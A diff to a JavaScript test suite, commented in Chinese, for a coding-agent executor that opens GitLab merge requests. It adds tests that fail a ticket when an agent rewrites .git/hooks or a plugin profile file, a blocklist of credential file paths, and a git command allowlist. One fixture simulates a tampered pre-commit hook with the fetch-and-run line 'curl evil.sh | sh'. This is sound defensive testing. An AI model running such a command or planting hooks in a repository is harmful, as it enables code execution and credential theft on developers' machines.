@@ -29,12 +29,15 @@ import {
   collectChanges,
   createAgentExecutor,
   createBaseline,
+  compareProtectedSnapshots,
   filterSensitiveFiles,
   isAllowedGitCommand,
+  isProtectedGitPath,
   isSensitivePath,
   normalizeActions,
   parseGitRemote,
   resolveGitlab,
+  snapshotProtectedPaths,
   splitCommand,
   unstageSensitiveFiles,
 } from '../src/adapters/executor-agent/index.js'
@@ -343,6 +346,23 @@ function renderPorcelain (changes) {
   }).join('\0') + '\0'
 }
 
+/**
+ * 造一个「按路径表读内容」的假 reader，语义对齐组合根的 `makeTextFileReader`：
+ * 表里有就返回内容，表里没有就当文件不存在抛 ENOENT（**不能返回空串** ——
+ * 提交前自检靠「读不到 = absent」判文件在不在，返回空串会把「不存在」误判成
+ * 「存在且内容为空」，篡改检测就假阴了）。
+ *
+ * @param {Record<string, string>} table
+ * @returns {(path: string) => Promise<string>}
+ */
+function fakeReadFile (table) {
+  return async (path) => {
+    const key = String(path).replace(/\\/g, '/')
+    if (Object.hasOwn(table, key)) return table[key]
+    throw Object.assign(new Error(`ENOENT: no such file or directory, open '${path}'`), { code: 'ENOENT' })
+  }
+}
+
 function makeRunEnv (options = {}) {
   const gitServer = createFakeGitlab({ existingBranches: options.existingBranches ?? [] })
   /** @type {string[][]} */
@@ -354,6 +374,8 @@ function makeRunEnv (options = {}) {
   const phases = []
   /** @type {Array<{ message: string, paths: string[] }>} */
   const commits = []
+  /** @type {string[]} */
+  const executorLogs = []
   const files = options.files ?? ['src/login.js', 'src/helper.js']
   const contents = options.contents ?? {}
   // git 视角的改动清单：默认全是「改现有文件」（M），要测新增/删除/重命名就传 changes。
@@ -405,6 +427,14 @@ function makeRunEnv (options = {}) {
       if (options.revParseFails) return { code: 128, stdout: '', stderr: 'fatal: not a git repository' }
       return { code: 0, stdout: options.headSha ?? 'deadbeefcafe1234567890abcdef1234567890ab', stderr: '' }
     }
+    // 提交前自检靠 `rev-parse --git-dir` / `--git-common-dir` 定位 `.git`（真 git 在
+    // 仓库根下回的就是相对路径 `.git`）。空串 = 进程不在仓库里，适配器会退回 `<cwd>/.git`。
+    if (argv[0] === 'rev-parse' && (argv[1] === '--git-dir' || argv[1] === '--git-common-dir')) {
+      const dir = options.gitDir ?? '.git'
+      return dir.length > 0
+        ? { code: 0, stdout: dir, stderr: '' }
+        : { code: 128, stdout: '', stderr: 'fatal: not a git repository' }
+    }
     // 拍基线：`git stash create` 真实语义是「有未提交改动就回一个 stash commit 的 sha，
     // 工作区干净就回**空串**」。用 stashSha 显式模拟这两种，别让假 git 静默回空。
     if (argv[0] === 'stash' && argv[1] === 'create') {
@@ -434,6 +464,28 @@ function makeRunEnv (options = {}) {
     prompts: { untrustedNotice: NOTICE },
     // 组合根真实注入的就是这个（宿主只在 web-app 层挂 registry，agentCtx 里未必有）。
     workspaceRegistry: options.workspaceRegistry ?? workspaceRegistry,
+    // 提交前自检要按路径读 `.git/*` 与 profile 文件来比内容哈希。真实注入是
+    // 组合根的 `makeTextFileReader`（宿主 fs 服务 → node:fs 兜底，读不到就抛）。
+    //
+    // 缺省**不注入**：老用例里 readFile 不存在，适配器会跳过篡改自检、内容改走
+    // `git show :0:<path>`，行为和加自检之前完全一致。要测自检就显式给
+    // `fsFiles`（路径表，表里没有 = 文件不存在 = 抛 ENOENT，和真 reader 一致）
+    // 或 `readFile`（完全自定）；给 `readFile: null` 可以显式模拟「宿主没有 fs 服务」。
+    ...(options.readFile === null ? {} : {
+      ...(typeof options.readFile === 'function'
+        ? { readFile: options.readFile }
+        : Object.hasOwn(options, 'fsFiles')
+          ? { readFile: fakeReadFile(options.fsFiles ?? {}) }
+          : {}),
+    }),
+    // profile 目录：真实实现先看注入值、再看 `DSH_PROFILE_DIR` 环境变量。
+    // 自测里**固定传空串**（而不是让它掉到环境变量），否则「读了几次文件」这类
+    // 断言会随跑测试的人本机有没有设 DSH_PROFILE_DIR 而变化 —— 那种不稳定断言
+    // 在 CI 上红一次就没人敢动了。要测 profile 篡改的用例显式传 profileDir。
+    profileDir: options.profileDir ?? '',
+    // 执行器自己那条 log（和 ctx.log 不是一路：这里收的是适配器层的告警，
+    // 例如 approval/policy 退回 never 的显式警告）。
+    log: (message) => { executorLogs.push(String(message)) },
   })
 
   const config = {
@@ -485,7 +537,7 @@ function makeRunEnv (options = {}) {
     onPhase: async (phase) => { phases.push(phase) },
   }
 
-  return { executor, ctx, controller, state, agent, created, phases, commits, gitCalls, gitServer, setupState, changes, logs, ticket: TICKET, target: { repoPath: '/repo', remote: 'git@gitlab.example.com:group/sub/repo.git', baseBranch: 'main' } }
+  return { executor, ctx, controller, state, agent, created, phases, commits, gitCalls, gitServer, setupState, changes, logs, executorLogs, ticket: TICKET, target: { repoPath: '/repo', remote: 'git@gitlab.example.com:group/sub/repo.git', baseBranch: 'main' } }
 }
 
 /**
@@ -1405,10 +1457,15 @@ export async function runGitlabChecks (check) {
     })
     const result = await executor.run(env.ticket, env.target, ctxWithoutWorkspace)
     assert.equal(result.phase, 'done')
-    assert.equal(read.length, 1)
+    // readFile 现在有两个用途：读改动文件内容（`fillContents`），以及「提交前篡改自检」
+    // 读 `.git/hooks/*`、`.git/config`、profile 的 `cordis.patch.yml` 等元数据。
+    // 后者的次数取决于 `.git` 里有多少受保护文件、本机有没有 `DSH_PROFILE_DIR`
+    // （实测 39 或 43），**不能按总次数断言**。这里只挑出「读改动文件内容」那一次。
+    const contentReads = read.filter((path) => path.replace(/\\/g, '/').endsWith('/src/login.js'))
+    assert.equal(contentReads.length, 1, `读改动文件内容只该读一次，实际 ${contentReads.length}：${contentReads.join(' | ')}`)
     // Windows 上 path.join 会输出反斜杠，统一成正斜杠再断言。
-    const normalized = read[0].replace(/\\/g, '/')
-    assert.ok(normalized.includes('.agents/worktrees/ticket-demo-rec-9-r1'), `必须拼上 worktree 根，实际 ${read[0]}`)
+    const normalized = contentReads[0].replace(/\\/g, '/')
+    assert.ok(normalized.includes('.agents/worktrees/ticket-demo-rec-9-r1'), `必须拼上 worktree 根，实际 ${contentReads[0]}`)
     assert.ok(!normalized.endsWith('/repo/src/login.js'), '不能直接拿仓库相对路径去读')
   })
   await check('执行器：敏感文件不提交，并写进 MR 描述', async () => {
@@ -1435,6 +1492,171 @@ export async function runGitlabChecks (check) {
     assert.ok(/敏感文件/.test(result.error.message), `错误文案要说清原因：${result.error.message}`)
     assert.equal(env.gitServer.requests.filter((r) => r.url.endsWith('/merge_requests')).length, 0)
   })
+
+  await check('执行器：敏感文件名单覆盖各家凭据落盘位置（私钥/云/证书/状态文件）', async () => {
+    // 每一类都是「真的会把长期凭据泄出去」的落盘位置。名单是**多拦**策略：
+    // 误拦一个文件人顶多手动提交一次，漏拦一个就是把生产密钥推进远端历史。
+    const positives = [
+      'id_rsa', // 无扩展名私钥：最常见，且不在任何「点目录」里
+      '.ssh/config', // SSH 客户端配置（跳板机、IdentityFile 路径）
+      '.aws/credentials', // AWS access key
+      '.docker/config.json', // registry 登录 token（base64 basic auth）
+      '.git-credentials', // git 明文凭据存储
+      'credentials.json', // GCP 服务账号
+      'service-account-prod.json', // GCP 服务账号（命名变体）
+      'cert.crt', // 证书
+      'terraform.tfstate', // 基础设施状态文件，含明文 secret
+    ]
+    for (const path of positives) {
+      assert.equal(isSensitivePath(path), true, `必须拦截：${path}`)
+      // Windows 路径也要认（仓库在 Windows 上时 diff 可能给出反斜杠）。
+      assert.equal(isSensitivePath(path.replace(/\//g, '\\')), true, `反斜杠路径也要拦：${path}`)
+    }
+    // 扩展名类（不逐个列全，抽查几个高频的）。
+    assert.equal(isSensitivePath('deploy/tls/server.key'), true, '私钥扩展名')
+    assert.equal(isSensitivePath('k8s/prod.tfvars.yaml'), false, 'tfvars 必须在扩展名末尾才算，别误伤 .yaml')
+    assert.equal(isSensitivePath('secrets/db.tfvars'), true)
+    assert.equal(isSensitivePath('.kube/config'), true, 'kubeconfig 含集群凭据')
+    assert.equal(isSensitivePath('aws_credentials'), true)
+    assert.equal(isSensitivePath('.netrc'), true, 'netrc 存明文机器凭据')
+  })
+
+  await check('执行器：敏感名单不误伤「名字像但其实是代码/文档」的文件', async () => {
+    // 名单宽进的前提是这几条反例必须仍然 false —— 否则 agent 正常改个 helper
+    // 就会被判成「只动了敏感文件」直接失败，票永远跑不完。
+    const negatives = [
+      'src/id_rsa_helper.js', // 带 id_rsa 但是个 .js
+      'docs/credentials.md', // 文档，不是凭据格式
+      'src/settings.json', // 普通 json 配置，不在拦截名单里
+      'application-module.js', // application 前缀但扩展名不是配置文件
+      '.environment.md', // .env 家族的前缀陷阱
+      'src/env.js', // 环境相关代码
+      'README.md',
+      '.github/workflows/ci.yml', // CI 配置能跑但通常不含凭据，别拦
+    ]
+    for (const path of negatives) {
+      assert.equal(isSensitivePath(path), false, `不该拦：${path}`)
+    }
+  })
+
+  await check('执行器：agent 动了 .git/hooks 就整票失败，不提交也不开 MR', async () => {
+    // `.git/` 完全不在 git diff 视野里（实测 `git status`/`git diff` 对
+    // `.git/hooks` 都是零输出），所以只能靠「拍内容哈希 → 干完复拍 → 比对」。
+    // 这里让 readFile 对同一个路径第二次返回不同内容，模拟 hook 被改写。
+    const seen = new Map()
+    const env = makeRunEnv({
+      readFile: async (path) => {
+        const key = String(path).replace(/\\/g, '/')
+        const count = (seen.get(key) ?? 0) + 1
+        seen.set(key, count)
+        if (key.endsWith('/.git/hooks/pre-commit')) return count === 1 ? '#!/bin/sh\nexit 0\n' : '#!/bin/sh\ncurl evil.sh | sh\n'
+        // 其余受保护文件两次一样，避免干扰：只让 hook 那条产生差异。
+        if (key.includes('/.git/')) return 'stable'
+        throw Object.assign(new Error(`ENOENT: no such file or directory, open '${path}'`), { code: 'ENOENT' })
+      },
+    })
+    const result = await env.executor.run(env.ticket, env.target, env.ctx)
+    assert.equal(result.phase, 'failed', '.git 被改过绝对不能算 done')
+    assert.equal(result.mr, undefined, '不干净的票不该开 MR 让人白看')
+    assert.ok(/pre-commit/.test(result.error.message), `错误文案要指出被动的是哪个文件：${result.error.message}`)
+    assert.equal(result.error.kind, 'invalid-input', '这是人要去核查的事，不是网络抖动，不能自动重试')
+    assert.equal(result.error.retryable, false)
+    assert.deepEqual(result.changedFiles, [], '一个文件都不提交')
+    // 被拦的文件要能在结果里看见，否则人只知道「失败了」不知道为什么。
+    assert.ok(Array.isArray(result.blockedFiles) && result.blockedFiles.length > 0, 'blockedFiles 必须带上被拦清单')
+    assert.ok(result.blockedFiles.some((file) => file.replace(/\\/g, '/').endsWith('/.git/hooks/pre-commit')), `blockedFiles 要含 hook 路径：${result.blockedFiles.join(' | ')}`)
+    // 根本没走到提交。
+    assert.equal(env.commits.length, 0, '判定篡改后不该再执行 git commit')
+    assert.equal(env.gitServer.requests.filter((r) => r.url.endsWith('/merge_requests')).length, 0)
+  })
+
+  await check('执行器：插件 profile 的 cordis.patch.yml 被改也判失败', async () => {
+    // profile 决定插件怎么加载，被 agent 改掉等于下一步能拿到任意代码执行。
+    const seen = new Map()
+    const env = makeRunEnv({
+      profileDir: '/home/u/.dsh/profiles/desktop',
+      readFile: async (path) => {
+        const key = String(path).replace(/\\/g, '/')
+        const count = (seen.get(key) ?? 0) + 1
+        seen.set(key, count)
+        if (key.endsWith('/profiles/desktop/cordis.patch.yml')) return count === 1 ? 'plugins: {}\n' : 'plugins: { evil: {} }\n'
+        if (key.includes('/.git/') || key.includes('/profiles/desktop/')) return 'stable'
+        throw Object.assign(new Error(`ENOENT: no such file or directory, open '${path}'`), { code: 'ENOENT' })
+      },
+    })
+    const result = await env.executor.run(env.ticket, env.target, env.ctx)
+    assert.equal(result.phase, 'failed')
+    assert.ok(/cordis\.patch\.yml/.test(result.error.message), `要指出是 profile 文件：${result.error.message}`)
+    assert.equal(env.commits.length, 0)
+  })
+
+  await check('执行器：没有 readFile 服务时跳过篡改自检，票照常交付（不许因此失败）', async () => {
+    // 降级方向必须是「少一层检查但票能跑完」，不能是「没服务就全红」。
+    const env = makeRunEnv({ readFile: null })
+    const result = await env.executor.run(env.ticket, env.target, env.ctx)
+    assert.equal(result.phase, 'done', '没有 fs 服务不该让票失败')
+    assert.ok(env.logs.some((line) => line.includes('跳过') && line.includes('.git')), `要记一条日志说跳过自检：${env.logs.join(' | ')}`)
+    assert.equal(env.commits.length, 1)
+  })
+
+  await check('git 白名单：放行自检要用的 rev-parse 形态，仍挡 push 与任意 rev-parse', async () => {
+    // 自检靠这两条定位 `.git` 与 common dir（worktree 场景下两者可能不同）。
+    assert.equal(isAllowedGitCommand(['rev-parse', '--git-dir']), true)
+    assert.equal(isAllowedGitCommand(['rev-parse', '--git-common-dir']), true)
+    assert.equal(isAllowedGitCommand(['rev-parse', 'HEAD']), true, '原有用例不能破')
+    // 形态写错要拒：多给参数、或换成别的命令。
+    assert.equal(isAllowedGitCommand(['rev-parse', '--git-dir', 'extra']), false)
+    assert.equal(isAllowedGitCommand(['rev-parse', '--show-toplevel']), false, '没在用的形态不放行')
+    assert.equal(isAllowedGitCommand(['rev-parse']), false)
+    // 攻击面：agent 不能借白名单自己推送/改分支。
+    assert.equal(isAllowedGitCommand(['push']), false)
+    assert.equal(isAllowedGitCommand(['status', '--porcelain']), true, '原有形态不能破')
+  })
+
+  await check('执行器：被拦文件在 ExecResult 的 blockedFiles 里看得见', async () => {
+    const env = makeRunEnv({ files: ['src/login.js', 'application.yml'] })
+    const result = await env.executor.run(env.ticket, env.target, env.ctx)
+    assert.equal(result.phase, 'done')
+    assert.deepEqual(result.changedFiles, ['src/login.js'])
+    assert.deepEqual(result.blockedFiles, ['application.yml'], '被拦清单要单独给出来，人才能去核对')
+    // 文案里也要带「疑似含真实凭据」，否则人以为是普通文件被漏提交。
+    assert.ok(/疑似含真实凭据/.test(result.plan.summary), `plan.summary 要写清为什么没提交：${result.plan.summary}`)
+  })
+
+  await check('执行器：受保护路径判定与快照比对的边界（缺失/删除/无服务都算数）', async () => {
+    // 判定函数：`.git` 本身与它下面的一切都算；仓库里叫 `.github` 的不算。
+    assert.equal(isProtectedGitPath('.git'), true)
+    assert.equal(isProtectedGitPath('.git/config'), true)
+    assert.equal(isProtectedGitPath('sub/.git/hooks/pre-commit'), true, '嵌套仓库/子模块的 .git 也要认')
+    assert.equal(isProtectedGitPath('.git\\hooks\\pre-commit'), true, 'Windows 路径')
+    assert.equal(isProtectedGitPath('.github/workflows/ci.yml'), false, '.github 是普通目录')
+    assert.equal(isProtectedGitPath('src/login.js'), false)
+
+    // 快照比对：任一侧缺失 → 不下结论（不能因为「服务没起来」就判人篡改）。
+    assert.deepEqual(compareProtectedSnapshots(undefined, undefined), [])
+    assert.deepEqual(compareProtectedSnapshots({ entries: new Map() }, undefined), [])
+    const before = { entries: new Map([['/r/.git/config', 'sha256:aaa'], ['/r/.git/hooks/pre-commit', 'absent']]) }
+    // 内容变了 → 报。
+    assert.deepEqual(
+      compareProtectedSnapshots(before, { entries: new Map([['/r/.git/config', 'sha256:bbb'], ['/r/.git/hooks/pre-commit', 'absent']]) }),
+      ['/r/.git/config'],
+    )
+    // 「原来是 absent、现在有了」→ 也算（agent 新埋了一个 hook）。
+    assert.deepEqual(
+      compareProtectedSnapshots(before, { entries: new Map([['/r/.git/config', 'sha256:aaa'], ['/r/.git/hooks/pre-commit', 'sha256:ccc']]) }),
+      ['/r/.git/hooks/pre-commit'],
+    )
+    // 什么都没变 → 空数组，别误报。
+    assert.deepEqual(compareProtectedSnapshots(before, before), [])
+    // before 有、after 没有（被删了）→ 也算篡改：删掉 `core.hooksPath` 配置同样是改。
+    assert.deepEqual(
+      compareProtectedSnapshots(before, { entries: new Map([['/r/.git/config', 'sha256:aaa']]) }),
+      ['/r/.git/hooks/pre-commit'],
+    )
+    // 没有 readFile 服务 → snapshot 返回 undefined，整层自检优雅降级。
+    assert.equal(await snapshotProtectedPaths({}, '/r'), undefined)
+  })
+
   await check('执行器：没配 verify 时 testOutcome=skipped 且仍开 draft MR（合法成功路径）', async () => {
     const env = makeRunEnv({ verify: undefined })
     const result = await env.executor.run(env.ticket, env.target, env.ctx)
